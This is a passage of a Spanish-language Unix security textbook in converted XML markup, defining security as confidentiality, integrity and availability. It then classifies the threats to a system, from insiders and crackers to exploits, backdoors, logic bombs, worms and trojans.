construcci&#x00F3;n de sistemas de autenticaci&#x00F3;n &#xFB01;ables y baratos o el dise~no de nuevos criptosistemas
seguros. Eso es seguridad inform&#x00E1;tica, y no lo que habitualmente se nos quiere hacer creer: la
seguridad inform&#x00E1;tica no consiste en conocerse todos los bugs de un sistema operativo, con sus
correspondientes exploits ni en jugar a superjakers en canales de IRC. Lamentablemente, este es
el panorama de la seguridad m&#x00E1;s visible en Espa~na en la actualidad; esperemos que alg&#x00FA;n d&#x02CA;&#x0131;a
cambie.
  </para></section><!--end section--><!--l. 127--><section 
role="section"><title><abbrev role="title-mark">1.3</abbrev><anchor 
   id="x1-80001.3"  ></anchor>&#x00BF;Qu&#x00E9; es seguridad?</title>
<!--l. 128--><para>  Podemos entender como seguridad una caracter&#x02CA;&#x0131;stica de cualquier sistema (inform&#x00E1;tico o no) que nos
indica que ese sistema est&#x00E1; libre de todo peligro, da~no o riesgo, y que es, en cierta manera, infalible. Como
esta caracter&#x02CA;&#x0131;stica, particularizando para el caso de sistemas operativos o redes de computadores, es muy
dif&#x02CA;&#x0131;cil de conseguir (seg&#x00FA;n la mayor&#x02CA;&#x0131;a de expertos, imposible), se suaviza la de&#xFB01;nici&#x00F3;n de seguridad y se pasa
a hablar de &#xFB01;abilidad (probabilidad de que un sistema se comporte tal y como se espera de &#x00E9;l)
m&#x00E1;s que de seguridad; por tanto, se habla de sistemas &#xFB01;ables en lugar de hacerlo de sistemas
seguros.
<!--br/-->
<!--br/-->A grandes rasgos se entiende que mantener un sistema seguro (o &#xFB01;able) consiste b&#x00E1;sicamente en garantizar

tres aspectos (<citation>[?]</citation>): con&#xFB01;dencialidad, integridad y disponibilidad. Algunos estudios (<citation>[?]</citation>,<citation>[?]</citation>&#x2026;) integran la
seguridad dentro de una propiedad m&#x00E1;s general de los sistemas, la con&#xFB01;abilidad, entendida como el nivel
de calidad del servicio ofrecido. Consideran la disponibilidad como un aspecto al mismo nivel que la
seguridad y no como parte de ella, por lo que dividen esta &#x00FA;ltima en s&#x00F3;lo las dos facetas restantes,
con&#xFB01;dencialidad e integridad. En este trabajo no seguiremos esa corriente por considerarla
minoritaria.
<!--br/-->
<!--br/-->&#x00BF;Qu&#x00E9; implica cada uno de los tres aspectos de los que hablamos? La con&#xFB01;dencialidad
nos dice que los objetos de un sistema han de ser accedidos &#x00FA;nicamente por elementos
autorizados a ello, y que esos elementos autorizados no van a convertir esa informaci&#x00F3;n en
disponible para otras entidades; la integridad signi&#xFB01;ca que los objetos s&#x00F3;lo pueden ser
modi&#xFB01;cados <anchor 
   id="x1-8001f1"  ></anchor><footnote><para>     Por modi&#xFB01;car entendemos escribir, cambiar, cambiar el estado, borrar y crear.</para></footnote>
por elementos autorizados, y de una manera controlada, y la disponibilidad indica que los objetos del
sistema tienen que permanecer accesibles a elementos autorizados; es el contrario de la negaci&#x00F3;n de
servicio. Generalmente tienen que existir los tres aspectos descritos para que haya seguridad: un
sistema Unix puede conseguir con&#xFB01;dencialidad para un determinado &#xFB01;chero haciendo que ning&#x00FA;n
usuario (ni siquiera el root) pueda leerlo, pero este mecanismo no proporciona disponibilidad
alguna.
<!--br/-->
<!--br/-->Dependiendo del entorno en que un sistema Unix trabaje, a sus responsables les interesar&#x00E1; dar prioridad a
un cierto aspecto de la seguridad. Por ejemplo, en un sistema militar se antepondr&#x00E1; la con&#xFB01;dencialidad de
los datos almacenados o transmitidos sobre su disponibilidad: seguramente, es preferible que alguien borre
informaci&#x00F3;n con&#xFB01;dencial (que se podr&#x02CA;&#x0131;a recuperar despu&#x00E9;s desde una cinta de backup) a que ese
mismo atacante pueda leerla, o a que esa informaci&#x00F3;n est&#x00E9; disponible en un instante dado para
los usuarios autorizados. En cambio, en un servidor NFS de un departamento se premiar&#x00E1; la
disponibilidad frente a la con&#xFB01;dencialidad: importa poco que un atacante lea una unidad, pero que
esa misma unidad no sea le&#x02CA;&#x0131;da por usuarios autorizados va a suponer una p&#x00E9;rdida de tiempo
y dinero. En un entorno bancario, la faceta que m&#x00E1;s ha de preocupar a los responsables del
sistema es la integridad de los datos, frente a su disponibilidad o su con&#xFB01;dencialidad: es menos
grave <anchor 
   id="x1-8002f2"  ></anchor><footnote><para>     Aunque por supuesto no es en absoluto recomendable.</para></footnote>
que un usuario consiga leer el saldo de otro que el hecho de que ese usuario pueda modi&#xFB01;carlo.
  </para></section><!--end section--><!--l. 180--><section 
role="section"><title><abbrev role="title-mark">1.4</abbrev><anchor 
   id="x1-90001.4"  ></anchor>&#x00BF;Qu&#x00E9; queremos proteger?</title>
<!--l. 181--><para>  Los tres elementos principales a proteger en cualquier sistema inform&#x00E1;tico son el software, el hardware y
los datos. Por hardware entendemos el conjunto formado por todos los elementos f&#x02CA;&#x0131;sicos de un sistema
inform&#x00E1;tico, como CPUs, terminales, cableado, medios de almacenamiento secundario (cintas, CD-ROMs,
diskettes&#x2026;) o tarjetas de red. Por software entendemos el conjunto de programas l&#x00F3;gicos que hacen
funcional al hardware, tanto sistemas operativos como aplicaciones, y por datos el conjunto
de informaci&#x00F3;n l&#x00F3;gica que manejan el software y el hardware, como por ejemplo paquetes que
circulan por un cable de red o entradas de una base de datos. Aunque generalmente en las
auditor&#x02CA;&#x0131;as de seguridad se habla de un cuarto elemento a proteger, los fungibles (elementos que se
gastan o desgastan con el uso cont&#x02CA;&#x0131;nuo, como papel de impresora, t&#x00F3;ners, cintas magn&#x00E9;ticas,
diskettes&#x2026;), aqu&#x02CA;&#x0131; no consideraremos la seguridad de estos elementos por ser externos al sistema
Unix.
<!--br/-->
<!--br/-->Habitualmente los datos constituyen el principal elemento de los tres a proteger, ya que es el m&#x00E1;s amenazado y seguramente
el m&#x00E1;s dif&#x02CA;&#x0131;cil de recuperar <anchor 
   id="x1-9001f3"  ></anchor><footnote><para>     Quiz&#x00E1;s no el m&#x00E1;s caro, pero s&#x02CA;&#x0131; el m&#x00E1;s dif&#x02CA;&#x0131;cil.</para></footnote>:
con toda seguridad una m&#x00E1;quina Unix est&#x00E1; ubicada en un lugar de acceso f&#x02CA;&#x0131;sico restringido, o al menos
controlado, y adem&#x00E1;s en caso de p&#x00E9;rdida de una aplicaci&#x00F3;n (o un programa de sistema, o el propio n&#x00FA;cleo de
Unix) este software se puede restaurar sin problemas desde su medio original (por ejemplo, el CD-ROM
con el sistema operativo que se utiliz&#x00F3; para su instalaci&#x00F3;n). Sin embargo, en caso de p&#x00E9;rdida de una base de
datos o de un proyecto de un usuario, no tenemos un medio &#x2018;original&#x2019; desde el que restaurar: hemos de
pasar obligatoriamente por un sistema de copias de seguridad, y a menos que la pol&#x02CA;&#x0131;tica de
copias sea muy estricta, es dif&#x02CA;&#x0131;cil devolver los datos al estado en que se encontraban antes de la
p&#x00E9;rdida.

<!--br/-->
<!--br/-->Contra cualquiera de los tres elementos descritos anteriormente (pero principalmente sobre
los datos) se pueden realizar multitud de ataques o, dicho de otra forma, est&#x00E1;n expuestos a
diferentes amenazas. Generalmente, la taxonom&#x02CA;&#x0131;a m&#x00E1;s elemental de estas amenazas las divide
en cuatro grandes grupos: interrupci&#x00F3;n, interceptaci&#x00F3;n, modi&#xFB01;caci&#x00F3;n y fabricaci&#x00F3;n. Un ataque se
clasi&#xFB01;ca como interrupci&#x00F3;n si hace que un objeto del sistema se pierda, quede inutilizable
o no disponible. Se tratar&#x00E1; de una interceptaci&#x00F3;n si un elemento no autorizado consigue un
acceso a un determinado objeto del sistema, y de una modi&#xFB01;caci&#x00F3;n si adem&#x00E1;s de conseguir el
acceso consigue modi&#xFB01;car el objeto; algunos autores (<citation>[?]</citation>) consideran un caso especial de la
modi&#xFB01;caci&#x00F3;n: la destrucci&#x00F3;n, entendi&#x00E9;ndola como una modi&#xFB01;caci&#x00F3;n que inutiliza al objeto afectado.
Por &#x00FA;ltimo, se dice que un ataque es una fabricaci&#x00F3;n si se trata de una modi&#xFB01;caci&#x00F3;n destinada
a conseguir un objeto similar al atacado de forma que sea dif&#x02CA;&#x0131;cil distinguir entre el objeto
original y el &#x2018;fabricado&#x2019;. En la &#xFB01;gura  <ulink 
  url="#x1-90021"  ><!--ref: ataques--></ulink> se muestran estos tipos de ataque de una forma gr&#x00E1;&#xFB01;ca.
</para><figure><title/><blockquote>


<section role="center"><title/>
<!--l. 230--><para> heightwidthdepthattacks.png<graphic width="50.05554pt" fileref="attacks.png" ></graphic></para></section>
<blockquote role="caption"><title role="caption"><anchor 
   id="x1-90021"  ></anchor>Figura&#x00A0;1.1</title><para>Flujo normal de informaci&#x00F3;n entre emisor y receptor y posibles amenazas: (a) interrupci&#x00F3;n,
(b) interceptaci&#x00F3;n, (c) modi&#xFB01;caci&#x00F3;n y (d) fabricaci&#x00F3;n.</para></blockquote>

  </blockquote></figure>
  </section><!--end section--><!--l. 238--><section 
role="section"><title><abbrev role="title-mark">1.5</abbrev><anchor 
   id="x1-100001.5"  ></anchor>&#x00BF;De qu&#x00E9; nos queremos proteger?</title>
<!--l. 239--><para>  En la gran mayor&#x02CA;&#x0131;a de publicaciones relativas a la seguridad inform&#x00E1;tica en general, y especialmente en
las relativas a seguridad en Unix, tarde o temprano se intenta clasi&#xFB01;car en grupos a los posibles elementos
que pueden atacar nuestro sistema. Con frecuencia, especialmente en las obras menos t&#x00E9;cnicas y m&#x00E1;s
orientadas a otros aspectos de la seguridad (<citation>[?]</citation>, <citation>[?]</citation>&#x2026;), se suele identi&#xFB01;car a los atacantes &#x00FA;nicamente como
personas; esto tiene sentido si hablamos por ejemplo de responsabilidades por un delito inform&#x00E1;tico.
Pero en este trabajo es preferible hablar de &#x2018;elementos&#x2019; y no de personas: aunque a veces lo
olvidemos, nuestro sistema puede verse perjudicado por m&#x00FA;ltiples entidades aparte de humanos,
como por ejemplo programas, cat&#x00E1;strofes naturales o, por qu&#x00E9; no, fuerzas extraterrestres; si un
usuario pierde un trabajo importante a causa de un ataque, poco le importar&#x00E1; que haya sido un
intruso, un gusano, un simple error del administrador, o un alien que haya abducido un disco
duro&#x2026;
<!--br/-->
<!--br/-->A continuaci&#x00F3;n se presenta una relaci&#x00F3;n de los elementos que potencialmente pueden amenazar a nuestro
sistema. No pretende ser exhaustiva, ni por supuesto una taxonom&#x02CA;&#x0131;a formal (para este tipo de estudios, se
recomienda consultar <citation>[?]</citation> o <citation>[?]</citation>); simplemente trata de proporcionar una idea acerca de qu&#x00E9; o qui&#x00E9;n amenaza
un sistema Unix. A lo largo de este proyecto se ahondar&#x00E1; en aspectos de algunos de los elementos
presentados aqu&#x02CA;&#x0131;.
  </para><!--l. 263--><section 
role="subsection"><title><abbrev role="title-mark">1.5.1</abbrev><anchor 
   id="x1-110001.5.1"  ></anchor>Personas</title>
<!--l. 264--><para>  No podernos enga~narnos: la mayor&#x02CA;&#x0131;a de ataques a nuestro sistema van a provenir en &#x00FA;ltima instancia de
personas que, intencionada o inintencionadamente, pueden causarnos enormes p&#x00E9;rdidas. Generalmente se
tratar&#x00E1; de piratas que intentan conseguir el m&#x00E1;ximo nivel de privilegio posible aprovechando alguno (o
algunos) de los riesgos l&#x00F3;gicos de los que hablaremos a continuaci&#x00F3;n, especialmente agujeros del
software. Pero con demasiada frecuencia se suele olvidar que los piratas &#x2018;cl&#x00E1;sicos&#x2019; no son los
&#x00FA;nicos que amenazan nuestros equipos: es especialmente preocupante que mientras que hoy en
d&#x02CA;&#x0131;a cualquier administrador m&#x02CA;&#x0131;nimamente preocupado por la seguridad va a conseguir un
sistema relativamente &#xFB01;able de una forma l&#x00F3;gica (permaneciendo atento a vulnerabilidades de su
software, restringiendo servicios, utilizando cifrado de datos&#x2026;), pocos administradores tienen en
cuenta factores como la ingenier&#x02CA;&#x0131;a social o el basureo a la hora de dise~nar una pol&#x02CA;&#x0131;tica de
seguridad.
<!--br/-->
<!--br/-->Aqu&#x02CA;&#x0131; se describen brevemente los diferentes tipos de personas que de una u otra forma pueden constituir
un riesgo para nuestros sistemas; generalmente se dividen en dos grandes grupos: los atacantes pasivos,
aquellos que &#xFB01;sgonean por el sistema pero no lo modi&#xFB01;can -o destruyen-, y los activos, aquellos que da~nan
el objetivo atacado, o lo modi&#xFB01;can en su favor. Generalmente los curiosos y los crackers realizan ataques
pasivos (que se pueden convertir en activos), mientras que los terroristas y ex-empleados realizan ataques
activos puros; los intrusos remunerados suelen ser atacantes pasivos si nuestra red o equipo no es su
objetivo, y activos en caso contrario, y el personal realiza ambos tipos indistintamente, dependiendo de la
situaci&#x00F3;n concreta.
<!--br/-->
     </para><itemizedlist>
     <listitem>
     <!--l. 291--><para>Personal
     <!--br/-->Las amenazas a la seguridad de un sistema provenientes del personal de la propia organizaci&#x00F3;n
     rara vez son tomadas en cuenta; se presupone un entorno de con&#xFB01;anza donde a veces no existe,
     por lo que se pasa por alto el hecho de que casi cualquier persona de la organizaci&#x00F3;n, incluso el
     personal ajeno a la infraestructura inform&#x00E1;tica (secretariado, personal de seguridad, personal
     de limpieza y mantenimiento&#x2026;) puede comprometer la seguridad de los equipos.
     <!--br/-->Aunque los ataques pueden ser intencionados (en cuyo caso sus efectos son extremadamente
     da~ninos, recordemos que nadie mejor que el propio personal de la organizaci&#x00F3;n conoce mejor

     los sistemas&#x2026;y sus debilidades), lo normal es que m&#x00E1;s que de ataques se trate de accidentes
     causados por un error o por desconocimiento <anchor 
   id="x1-11001f4"  ></anchor><footnote><para>     O inexistencia.</para></footnote>
     de las normas b&#x00E1;sicas de seguridad: un empleado de mantenimiento que corta el suministro
     el&#x00E9;ctrico para hacer una reparaci&#x00F3;n puede llegar a ser tan peligroso como el m&#x00E1;s experto de los
     administradores que se equivoca al teclear una orden y borra todos los sistemas de &#xFB01;cheros; y
     en el primer caso, el &#x2018;atacante&#x2019; ni siquiera ha de tener acceso l&#x00F3;gico (&#x00A1;ni f&#x02CA;&#x0131;sico!) a los equipos,
     ni conocer nada sobre seguridad en Unix. Hemos de recordar siempre que decir &#x2018;No lo hice a
     prop&#x00F3;sito&#x2019; no va a servir para recuperar datos perdidos ni para restaurar un hardware da~nado
     o robado.
     </para></listitem>
     <listitem>
     <!--l. 312--><para>Ex-empleados
     <!--br/-->Otro gran grupo de personas potencialmente interesadas en atacar nuestro sistema son los
     antiguos empleados del mismo, especialmente los que no abandonaron el entorno por voluntad
     propia (y en el caso de redes de empresas, los que pasaron a la competencia). Generalmente,
     se trata de personas descontentas con la organizaci&#x00F3;n que pueden aprovechar debilidades de
     un sistema que conocen perfectamente para da~narlo como venganza por alg&#x00FA;n hecho que no
     consideran justo: amparados en excusas como &#x2018;No me han pagado lo que me deben&#x2019; o &#x2018;Es
     una gran universidad, se lo pueden permitir&#x2019; pueden insertar troyanos, bombas l&#x00F3;gicas, virus&#x2026;o
     simplemente conectarse al sistema como si a&#x00FA;n trabajaran para la organizaci&#x00F3;n (muchas veces se
     mantienen las cuentas abiertas incluso meses despu&#x00E9;s de abandonar la universidad o empresa),
     conseguir el privilegio necesario, y da~narlo de la forma que deseen, incluso chantajeando a sus
     ex-compa~neros o ex-jefes.
     </para></listitem>
     <listitem>
     <!--l. 327--><para>Curiosos
     <!--br/-->Junto con los crackers, los curiosos son los atacantes m&#x00E1;s habituales de sistemas Unix en redes
     de I+D. Recordemos que los equipos est&#x00E1;n trabajando en entornos donde se forma a futuros
     profesionales de la inform&#x00E1;tica y las telecomunicaciones (gente que a priori tiene inter&#x00E9;s por las
     nuevas tecnolog&#x02CA;&#x0131;as), y recordemos tambi&#x00E9;n que las personas suelen ser curiosas por naturaleza;
     esta combinaci&#x00F3;n produce una avalancha de estudiantes o personal intentando conseguir mayor
     privilegio del que tienen o intentando acceder a sistemas a los que o&#xFB01;cialmente no tienen
     acceso. Y en la mayor&#x02CA;&#x0131;a de ocasiones esto se hace simplemente para leer el correo de un amigo,
     enterarse de cu&#x00E1;nto cobra un compa~nero, copiar un trabajo o comprobar que es posible romper
     la seguridad de un sistema concreto. Aunque en la mayor&#x02CA;&#x0131;a de situaciones se trata de ataques
     no destructivos (a excepci&#x00F3;n del borrado de huellas para evitar la detecci&#x00F3;n), parece claro que
     no bene&#xFB01;cian en absoluto al entorno de &#xFB01;abilidad que podamos generar en un determinado
     sistema.
     </para></listitem>
     <listitem>
     <!--l. 343--><para>Crackers
     <!--br/-->Los entornos de seguridad media son un objetivo t&#x02CA;&#x0131;pico de los intrusos, ya sea para &#xFB01;sgonear,
     para  utilizarlas  como  enlace  hacia  otras  redes  o  simplemente  por  diversi&#x00F3;n.  Por  un  lado,
     son redes generalmente abiertas, y la seguridad no es un factor tenido muy en cuenta en
     ellas; por otro, el gran n&#x00FA;mero y variedad de sistemas Unix conectados a estas redes provoca,
     casi por simple probabilidad, que al menos algunos de sus equipos (cuando no la mayor&#x02CA;&#x0131;a)
     sean vulnerables a problemas conocidos de antemano. De esta forma un atacante s&#x00F3;lo ha de
     utilizar un esc&#x00E1;ner de seguridad contra el dominio completo y luego atacar mediante un simple
     exploit los equipos que presentan vulnerabilidades; esto convierte a las redes de I+D, a las de
     empresas, o a las de ISPs en un objetivo f&#x00E1;cil y apetecible para piratas con cualquier nivel de
     conocimientos, desde los m&#x00E1;s novatos (y a veces m&#x00E1;s peligrosos) hasta los expertos, que pueden
     utilizar toda la red para probar nuevos ataques o como nodo intermedio en un ataque a otros
     organismos, con el consiguiente deterioro de imagen (y a veces de presupuesto) que supone
     para una universidad ser, sin desearlo, un apoyo a los piratas que atacan sistemas te&#x00F3;ricamente
     m&#x00E1;s protegidos, como los militares.

     </para></listitem>
     <listitem>
     <!--l. 363--><para>Terroristas
     <!--br/-->Por &#x2018;terroristas&#x2019; no debemos entender simplemente a los que se dedican a poner bombas o
     quemar autobuses; bajo esta de&#xFB01;nici&#x00F3;n se engloba a cualquier persona que ataca al sistema
     simplemente por causar alg&#x00FA;n tipo de da~no en &#x00E9;l. Por ejemplo, alguien puede intentar borrar las
     bases de datos de un partido pol&#x02CA;&#x0131;tico enemigo o destruir los sistemas de &#xFB01;cheros de un servidor
     que alberga p&#x00E1;ginas web de alg&#x00FA;n grupo religioso; en el caso de redes de I+D, t&#x02CA;&#x0131;picos ataques
     son la destrucci&#x00F3;n de sistemas de pr&#x00E1;cticas o la modi&#xFB01;caci&#x00F3;n de p&#x00E1;ginas web de alg&#x00FA;n departamento
     o de ciertos profesores, generalmente por parte de alumnos descontentos.
     </para></listitem>
     <listitem>
     <!--l. 373--><para>Intrusos remunerados
     <!--br/-->Este es el grupo de atacantes de un sistema m&#x00E1;s peligroso, aunque por fortuna el menos habitual
     en redes normales; suele afectar m&#x00E1;s a las grandes &#x2013; muy grandes &#x2013; empresas o a organismos
     de defensa. Se trata de piratas con gran experiencia en problemas de seguridad y un amplio
     conocimiento del sistema, que son pagados por una tercera parte <anchor 
   id="x1-11002f5"  ></anchor><footnote><para>     Si los pagara la organizaci&#x00F3;n propietaria de los equipos hablar&#x02CA;&#x0131;amos de grupos Tigre.</para></footnote>
     generalmente para robar secretos (el nuevo dise~no de un procesador, una base de datos de
     clientes, informaci&#x00F3;n con&#xFB01;dencial sobre las posiciones de sat&#x00E9;lites esp&#x02CA;&#x0131;a&#x2026;) o simplemente para
     da~nar  la  imagen  de  la  entidad  afectada.  Esta  tercera  parte  suele  ser  una  empresa  de  la
     competencia o un organismo de inteligencia, es decir, una organizaci&#x00F3;n que puede permitirse
     un gran gasto en el ataque; de ah&#x02CA;&#x0131; su peligrosidad: se suele pagar bien a los mejores piratas,
     y por si esto fuera poco los atacantes van a tener todos los medios necesarios a su alcance.
     <!--br/-->Aunque como hemos dicho los intrusos remunerados son los menos comunes en la mayor&#x02CA;&#x0131;a
     de situaciones, en ciertas circunstancias pueden aprovechar nuestras redes como plataforma
     para atacar otros organismos; una excelente lectura sobre esta situaci&#x00F3;n es <citation>[?]</citation>, en la que el
     experto en seguridad Cli&#xFB00; Stoll describe c&#x00F3;mo piratas pagados por el KGB sovi&#x00E9;tico utilizaron
     redes y sistemas Unix dedicados a I+D para acceder a organismos de defensa e inteligencia
     estadounidenses.</para></listitem></itemizedlist>
<!--l. 397--><para>
  </para></section><!--end subsection--><!--l. 397--><section 
role="subsection"><title><abbrev role="title-mark">1.5.2</abbrev><anchor 
   id="x1-120001.5.2"  ></anchor>Amenazas l&#x00F3;gicas</title>
<!--l. 398--><para>  Bajo la etiqueta de &#x2018;amenazas l&#x00F3;gicas&#x2019; encontramos todo tipo de programas que de una forma u otra
pueden da~nar a nuestro sistema, creados de forma intencionada para ello (software malicioso, tambi&#x00E9;n
conocido como malware) o simplemente por error (bugs o agujeros). Una excelente lectura
que estudia las de&#xFB01;niciones de algunas de estas amenazas y su implicaci&#x00F3;n en el sistema Unix
se presenta en <citation>[?]</citation>; otra buena descripci&#x00F3;n, pero a un nivel m&#x00E1;s general, se puede encontrar en
<citation>[?]</citation>.
     </para><itemizedlist>
     <listitem>
     <!--l. 407--><para>Software incorrecto
     <!--br/-->Las amenazas m&#x00E1;s habituales a un sistema Unix provienen de errores cometidos de forma
     involuntaria por los programadores de sistemas o de aplicaciones. Una situaci&#x00F3;n no contemplada
     a la hora de dise~nar el sistema de red del kernel o un error accediendo a memoria en un
     &#xFB01;chero setuidado pueden comprometer local o remotamente a Unix (o a cualquier otro sistema
     operativo).
     <!--br/-->A  estos  errores  de  programaci&#x00F3;n  se  les  denomina  bugs,  y  a  los  programas  utilizados  para
     aprovechar uno de estos fallos y atacar al sistema, exploits. Como hemos dicho, representan la
     amenaza m&#x00E1;s com&#x00FA;n contra Unix, ya que cualquiera puede conseguir un exploit y utilizarlo contra
     nuestra m&#x00E1;quina sin ni siquiera saber c&#x00F3;mo funciona y sin unos conocimientos m&#x02CA;&#x0131;nimos de Unix;
     incluso hay exploits que da~nan seriamente la integridad de un sistema (negaciones de servicio
     o incluso acceso root remoto) y est&#x00E1;n preparados para ser utilizados desde MS-DOS, con lo que
     cualquier pirata novato (com&#x00FA;nmente, se les denomina Script Kiddies) puede utilizarlos contra
     un servidor y conseguir un control total de una m&#x00E1;quina de varios millones de pesetas desde

     su PC sin saber nada del sistema atacado; incluso hay situaciones en las que se analizan los
     logs de estos ataques y se descubre que el pirata incluso intenta ejecutar &#x00F3;rdenes de MS-DOS.
     </para></listitem>
     <listitem>
     <!--l. 427--><para>Herramientas de seguridad
     <!--br/-->Cualquier herramienta de seguridad representa un arma de doble &#xFB01;lo: de la misma forma
     que un administrador las utiliza para detectar y solucionar fallos en sus sistemas o en la
     subred completa, un potencial intruso las puede utilizar para detectar esos mismos fallos
     y aprovecharlos para atacar los equipos. Herramientas como NESSUS, SAINT o SATAN pasan
     de ser &#x00FA;tiles a ser peligrosas cuando las utilizan crackers que buscan informaci&#x00F3;n sobre las
     vulnerabilidades de un host o de una red completa.
     <!--br/-->La conveniencia de dise~nar y distribuir libremente herramientas que puedan facilitar un ataque
     es un tema peliagudo; incluso expertos reconocidos como Alec Mu&#xFB00;et (autor del adivinador de
     contrase~nas Crack) han recibido enormes cr&#x02CA;&#x0131;ticas por dise~nar determinadas herramientas de
     seguridad para Unix. Tras numerosos debates sobre el tema, ha quedado bastante claro que no
     se puede basar la seguridad de un sistema en el supuesto desconocimiento de sus problemas por
     parte de los atacantes: esta pol&#x02CA;&#x0131;tica, denominada Security through obscurity, se ha demostrado
     inservible  en  m&#x00FA;ltiples  ocasiones.  Si  como  administradores  no  utilizamos  herramientas  de
     seguridad que muestren las debilidades de nuestros sistemas (para corregirlas), tenemos que
     estar seguro que un atacante no va a dudar en utilizar tales herramientas (para explotar las
     debilidades encontradas); por tanto, hemos de agradecer a los dise~nadores de tales programas
     el esfuerzo que han realizado (y nos han ahorrado) en pro de sistemas m&#x00E1;s seguros.
     </para></listitem>
     <listitem>
     <!--l. 449--><para>Puertas traseras
     <!--br/-->Durante el desarrollo de aplicaciones grandes o de sistemas operativos es habitual entre los
     programadores insertar &#x2018;atajos&#x2019; en los sistemas habituales de autenticaci&#x00F3;n del programa o del
     n&#x00FA;cleo que se est&#x00E1; dise~nando. A estos atajos se les denomina puertas traseras, y con ellos se
     consigue mayor velocidad a la hora de detectar y depurar fallos: por ejemplo, los dise~nadores
     de un software de gesti&#x00F3;n de bases de datos en el que para acceder a una tabla se necesiten
     cuatro claves diferentes de diez caracteres cada una pueden insertar una rutina para conseguir
     ese acceso mediante una &#x00FA;nica clave &#x2018;especial&#x2019;, con el objetivo de perder menos tiempo al
     depurar el sistema.
     <!--br/-->Algunos programadores pueden dejar estos atajos en las versiones de&#xFB01;nitivas de su software
     para facilitar un mantenimiento posterior, para garantizar su propio acceso, o simplemente
     por descuido; la cuesti&#x00F3;n es que si un atacante descubre una de estas puertas traseras (no nos
     importa el m&#x00E9;todo que utilice para hacerlo) va a tener un acceso global a datos que no deber&#x02CA;&#x0131;a
     poder leer, lo que obviamente supone un grave peligro para la integridad de nuestro sistema.
     </para></listitem>
     <listitem>
     <!--l. 467--><para>Bombas l&#x00F3;gicas
     <!--br/-->Las bombas l&#x00F3;gicas son partes de c&#x00F3;digo de ciertos programas que permanecen sin realizar
     ninguna funci&#x00F3;n hasta que son activadas; en ese punto, la funci&#x00F3;n que realizan no es la original
     del programa, sino que generalmente se trata de una acci&#x00F3;n perjudicial.
     <!--br/-->Los activadores m&#x00E1;s comunes de estas bombas l&#x00F3;gicas pueden ser la ausencia o presencia de
     ciertos &#xFB01;cheros, la ejecuci&#x00F3;n bajo un determinado UID o la llegada de una fecha concreta;
     cuando la bomba se activa va a poder realizar cualquier tarea que pueda realizar la persona que
     ejecuta el programa: si las activa el root, o el programa que contiene la bomba est&#x00E1; setuidado
     a su nombre, los efectos obviamente pueden ser fatales.
     </para></listitem>
     <listitem>
     <!--l. 478--><para>Canales cubiertos
     <!--br/-->Seg&#x00FA;n la de&#xFB01;nici&#x00F3;n de <citation>[?]</citation> y <citation>[?]</citation>, los canales cubiertos (o canales ocultos, seg&#x00FA;n otras traducciones)

     son canales de comunicaci&#x00F3;n que permiten a un proceso transferir informaci&#x00F3;n de forma que viole
     la pol&#x02CA;&#x0131;tica de seguridad del sistema; dicho de otra forma, un proceso transmite informaci&#x00F3;n a
     otros (locales o remotos) que no est&#x00E1;n autorizados a leer dicha informaci&#x00F3;n.
     <!--br/-->Los canales cubiertos no son una amenaza demasiado habitual en redes de I+D, ya que suele
     ser mucho m&#x00E1;s f&#x00E1;cil para un atacante aprovechar cualquier otro mecanismo de ataque l&#x00F3;gico; sin
     embargo, es posible su existencia, y en este caso su detecci&#x00F3;n suele ser dif&#x02CA;&#x0131;cil: algo tan simple
     como el puerto finger abierto en una m&#x00E1;quina puede ser utilizado a modo de covert channel
     por un pirata con algo de experiencia.
     </para></listitem>
     <listitem>
     <!--l. 491--><para>Virus
     <!--br/-->Un virus es una secuencia de c&#x00F3;digo que se inserta en un &#xFB01;chero ejecutable (denominado hu&#x00E9;sped),
     de forma que cuando el archivo se ejecuta, el virus tambi&#x00E9;n lo hace, insert&#x00E1;ndose a s&#x02CA;&#x0131; mismo en
     otros programas.
     <!--br/-->Todo el mundo conoce los efectos de los virus en algunos sistemas operativos de sobremesa;
     sin embargo, en Unix los virus no suelen ser un problema de seguridad grave, ya que lo que
     pueda hacer un virus lo puede hacer m&#x00E1;s f&#x00E1;cilmente cualquier otro mecanismo l&#x00F3;gico (que ser&#x00E1; el
     que hay que tener en cuenta a la hora de dise~nar una pol&#x02CA;&#x0131;tica de seguridad).
     <!--br/-->Aunque los virus existentes para entornos Unix son m&#x00E1;s una curiosidad que una amenaza real,
     en sistemas sobre plataformas IBM-PC o compatibles (recordemos que hay muchos sistemas
     Unix  que  operan  en  estas  plataformas,  como  Linux,  FreeBSD,  NetBSD,  Minix,  Solaris&#x2026;)
     ciertos virus, especialmente los de boot, pueden tener efectos nocivos, como da~nar el sector de
     arranque; aunque se trata de da~nos menores comparados con los efectos de otras amenazas,
     hay que tenerlos en cuenta.
     </para></listitem>
     <listitem>
     <!--l. 507--><para>Gusanos
     <!--br/-->Un gusano es un programa capaz de ejecutarse y propagarse por s&#x02CA;&#x0131; mismo a trav&#x00E9;s de redes, en
     ocasiones portando virus o aprovechando bugs de los sistemas a los que conecta para da~narlos.
     Al ser dif&#x02CA;&#x0131;ciles de programar su n&#x00FA;mero no es muy elevado, pero el da~no que pueden causar es
     muy grande: el mayor incidente de seguridad en Internet fu&#x00E9; precisamente el Internet Worm,
     un gusano que en 1988 caus&#x00F3; perdidas millonarias al infectar y detener m&#x00E1;s de 6000 m&#x00E1;quinas
     conectadas a la red.
     <!--br/-->Hemos de pensar que un gusano puede automatizar y ejecutar en unos segundos todos los pasos
     que seguir&#x02CA;&#x0131;a un atacante humano para acceder a nuestro sistema: mientras que una persona,
     por muchos conocimientos y medios que posea, tardar&#x02CA;&#x0131;a como m&#x02CA;&#x0131;nimo horas en controlar
     nuestra red completa (un tiempo m&#x00E1;s que razonable para detectarlo), un gusano puede hacer
     eso mismo en pocos minutos: de ah&#x02CA;&#x0131; su enorme peligro y sus devastadores efectos.
     </para></listitem>
     <listitem>
     <!--l. 522--><para>Caballos de Troya
     <!--br/-->Los troyanos o caballos de Troya son instrucciones escondidas en un programa de forma que
     &#x00E9;ste parezca realizar las tareas que un usuario espera de &#x00E9;l, pero que realmente ejecute funciones
     ocultas (generalmente en detrimento de la seguridad) sin el conocimiento del usuario; como
     el Caballo de Troya de la mitolog&#x02CA;&#x0131;a griega, al que deben su nombre, ocultan su funci&#x00F3;n real
     bajo la apariencia de un programa inofensivo que a primera vista funciona correctamente.
     <!--br/-->En la pr&#x00E1;ctica totalidad de los ataques a Unix, cuando un intruso consigue el privilegio necesario
     en el sistema instala troyanos para ocultar su presencia o para asegurarse la entrada en caso
